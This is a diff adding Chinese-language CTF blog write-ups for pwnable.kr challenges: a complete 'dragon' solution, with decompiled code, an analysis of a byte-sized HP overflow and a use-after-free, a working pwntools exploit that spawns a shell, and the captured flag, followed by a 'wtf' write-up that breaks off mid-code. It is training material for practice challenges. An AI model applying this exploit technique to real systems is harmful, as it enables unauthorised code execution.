@@ -82,6 +82,439 @@
 
       <div class="outer">
         <section id="main">
+  <article id="post-pwnable-kr-dragon" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-dragon/">pwnable.kr_dragon</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-29T15:04:25.000Z" itemprop="datePublished">2021年11月29日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/">wp</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-dragon/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/klose/ctf/pwn/file/buuctf/pwnable_dragon/dragon&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>32位程序，开了<code>canary</code>和<code>NX</code>；</p>
+<h3 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./dragon </span><br><span class="line">Welcome to Dragon Hunter!</span><br><span class="line">Choose Your Hero</span><br><span class="line">[ 1 ] Priest</span><br><span class="line">[ 2 ] Knight</span><br></pre></td></tr></table></figure>
+
+<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>放到ida32里分析，程序的执行流程大概如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Dragon Hunter!&quot;</span>);</span><br><span class="line">  PlayGame();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PlayGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight&quot;</span>);</span><br><span class="line">      result = GetChoice();</span><br><span class="line">      <span class="keyword">if</span> ( result != <span class="number">1</span> &amp;&amp; result != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      FightDragon(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( result != <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    SecretLevel();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里看到有一个<code>SecretLevel()</code>的函数可以执行，选择<code>3</code>即可；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">SecretLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">10</span>]; <span class="comment">// [esp+12h] [ebp-16h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to Secret Level!\nInput Password : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;Nice_Try_But_The_Dragons_Won&#x27;t_Let_You!&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，如果通过了<code>strcmp()</code>的比较字符串函数，就可以成功执行<code>system(&quot;/bin/sh&quot;)</code>提权，但是看到<code>s1[10]</code>最多只能容纳10个字符，因此比较会失败；</p>
+<p>回过头来，选择1或者2进入<code>FightDragon()</code>函数；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">FightDragon</span><span class="params">(<span class="keyword">int</span> character_choice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);                          <span class="comment">// character</span></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);                           <span class="comment">// dragon</span></span><br><span class="line">  v1 = Count++;</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) != <span class="number">0</span> )                  		<span class="comment">// Mama Dragon</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">8</span>) = <span class="number">80</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">9</span>) = <span class="number">4</span>;</span><br><span class="line">    v4[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">    *v4 = PrintMonsterInfo;                     <span class="comment">// 打印龙的信息的函数指针</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Mama Dragon Has Appeared!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>											<span class="comment">// Baby Dragon</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">8</span>) = <span class="number">50</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">9</span>) = <span class="number">5</span>;</span><br><span class="line">    v4[<span class="number">3</span>] = <span class="number">30</span>;</span><br><span class="line">    *v4 = PrintMonsterInfo;                     <span class="comment">// 打印龙的信息的函数指针</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Baby Dragon Has Appeared!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( character_choice == <span class="number">1</span> )					<span class="comment">// 玩家选择Priest</span></span><br><span class="line">  &#123;</span><br><span class="line">    *ptr = <span class="number">1</span>;</span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">42</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">50</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = PrintPlayerInfo;</span><br><span class="line">    v2 = PriestAttack((<span class="keyword">int</span>)ptr, v4);			<span class="comment">// 返回1:龙被击败，返回0：玩家被击败</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( character_choice != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    *ptr = <span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">50</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = PrintPlayerInfo;</span><br><span class="line">    v2 = KnightAttack((<span class="keyword">int</span>)ptr, v4);			<span class="comment">// 返回1:龙被击败，返回0：玩家被击败</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )										<span class="comment">// 如果龙被击败</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well Done Hero! You Killed The Dragon!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The World Will Remember You As:&quot;</span>);</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);							<span class="comment">// malloc一个新的chunk</span></span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, v5);					<span class="comment">// 允许往chunk输入数据</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And The Dragon You Have Defeated Was Called:&quot;</span>);</span><br><span class="line">    ((<span class="keyword">void</span> (__cdecl *)(_DWORD *))*v4)(v4);      <span class="comment">// 执行函数指针所指函数，但是之前这个ptr已经被free掉</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou Have Been Defeated!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);									<span class="comment">// free玩家角色的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看一下其中一个角色的进攻函数，如<code>KnighAttack()</code>；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">KnightAttack</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr)(ptr);</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">int</span>))(a1 + <span class="number">12</span>))(a1);</span><br><span class="line">    v2 = GetChoice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Crash Deals %d Damage To The Dragon!\n&quot;</span>, <span class="number">20</span>);</span><br><span class="line">      *((_BYTE *)ptr + <span class="number">8</span>) -= <span class="number">20</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;But The Dragon Deals %d Damage To You!\n&quot;</span>, *((_DWORD *)ptr + <span class="number">3</span>));</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) -= *((_DWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;And The Dragon Heals %d HP!\n&quot;</span>, *((<span class="keyword">char</span> *)ptr + <span class="number">9</span>));</span><br><span class="line">      *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Frenzy Deals %d Damage To The Dragon!\n&quot;</span>, <span class="number">40</span>);</span><br><span class="line">      *((_BYTE *)ptr + <span class="number">8</span>) -= <span class="number">40</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;But You Also Lose 20 HP...&quot;</span>);</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) -= <span class="number">20</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;And The Dragon Deals %d Damage To You!\n&quot;</span>, *((_DWORD *)ptr + <span class="number">3</span>));</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) -= *((_DWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Plus The Dragon Heals %d HP!\n&quot;</span>, *((<span class="keyword">char</span> *)ptr + <span class="number">9</span>));</span><br><span class="line">      *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="keyword">int</span> *)(a1 + <span class="number">4</span>) &lt;= <span class="number">0</span> )				<span class="comment">// 如果玩家的血量 &lt;= 0，free ptr，返回v2=0，即玩家失败</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( *((<span class="keyword">char</span> *)ptr + <span class="number">8</span>) &gt; <span class="number">0</span> );				<span class="comment">// 如果龙的血量 &gt;0，则不断循环，龙被击败则返回v2=1</span></span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过上述代码的分析，我们可以利用<code>uaf</code>来执行目标函数<code>system(&quot;/bin/sh&quot;)</code>，即：<code>free(ptr)</code>后，立马<code>malloc</code>一个同样大小的堆块，因此<code>ptr</code>被重新利用，输入<code>system(&quot;/bin/sh&quot;)</code>的地址即可拿到shell；</p>
+<p>但是前提是需要击败龙赢得游戏，如果按照正常逻辑来玩是不可能打败龙的，但是观察到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Crash Deals %d Damage To The Dragon!\n&quot;</span>, <span class="number">20</span>);</span><br><span class="line">*((_BYTE *)ptr + <span class="number">8</span>) -= <span class="number">20</span>;</span><br></pre></td></tr></table></figure>
+
+<p>龙的血量是以<code>_BYTE</code>数据类型，如果龙的血量<code> &gt; 127</code>的话，就会变成负数，判断时当然会满足并退出<code>while</code>循环，即：玩家胜利；</p>
+<p>观察代码，龙每个回合都会<code>+4</code>的血量；</p>
+<p>另外，奇数回合是<code>50</code>血量的<code>baby dragon</code>，而偶数回合是<code>80</code>血量的<code>mama dragon</code>；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) != <span class="number">0</span> )                  		<span class="comment">// Mama Dragon</span></span><br><span class="line"> &#123;</span><br><span class="line">   v4[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">   *((_BYTE *)v4 + <span class="number">8</span>) = <span class="number">80</span>;					<span class="comment">// 血量</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">   *v4 = PrintMonsterInfo;                     <span class="comment">// 打印龙的信息的函数指针</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Mama Dragon Has Appeared!&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>											<span class="comment">// Baby Dragon</span></span><br><span class="line"> &#123;</span><br><span class="line">   v4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">   *((_BYTE *)v4 + <span class="number">8</span>) = <span class="number">50</span>;					<span class="comment">// 血量</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">   *v4 = PrintMonsterInfo;                     <span class="comment">// 打印龙的信息的函数指针</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Baby Dragon Has Appeared!&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此自然是和<code>mama dragon</code>战斗更容易让它的血量大于127，接下来看能不能苟住不死；</p>
+<p>观察到牧师有一个技能是回蓝，并且还有一个技能是消耗蓝来避免遭到攻击，因此巧妙利用这两个技能就可以苟得尽量久，让龙加血自己加到“死”；</p>
+<p>每次蓝用两次后就必须要回蓝，因此3技能庇护用两次，2技能回蓝用一次，循环用；</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">proc_name = <span class="string">&#x27;dragon&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line">islocal = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> islocal:</span><br><span class="line">    p = process(proc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26809</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048DBF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># baby dragon</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Knight\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># baby dragon攻击力比较高，一次扣30滴血，两回合就无了</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;You Become Temporarily Invincible.\n&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;You Become Temporarily Invincible.\n&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;You Become Temporarily Invincible.\n&quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mama dragon</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Knight\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># mama dragon攻击力比较低，一次扣10滴血，可以抗5次攻击，这里抗住4次攻击就可以让它的血量恢复到128</span></span><br><span class="line"><span class="comment"># 龙一共回的血：(每回合4血 * 3回合) * 循环4次 = 48, 48 + 80 = 128 &gt; 127</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):                 </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;You Become Temporarily Invincible.\n&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;You Become Temporarily Invincible.\n&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;You Become Temporarily Invincible.\n&quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;The World Will Remember You As:\n&quot;</span>, p32(system_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">And The Dragon You Have Defeated Was Called:</span><br><span class="line">$ cat /flag</span><br><span class="line">flag&#123;K1os32J0yc34ever&#125;</span><br></pre></td></tr></table></figure>
+
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/2/index.html">https://www.jk404.cn/page/2/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
+  <article id="post-pwnable-kr-wtf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-wtf/">pwnable.kr_wtf</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-29T14:27:25.000Z" itemprop="datePublished">2021年11月29日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/">wp</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-wtf/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="wtf"><a href="#wtf" class="headerlink" title="wtf"></a>wtf</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h3 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./wtf </span><br><span class="line">klose</span><br></pre></td></tr></table></figure>
+
+<p>输入一个字符串，程序就退出了；</p>
+<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>放到ida64里分析；</p>
+<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [rsp+3Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input &gt; <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;preventing buffer overflow&quot;</span>);</span><br><span class="line">    input = <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  my_fgets((__int64)str, 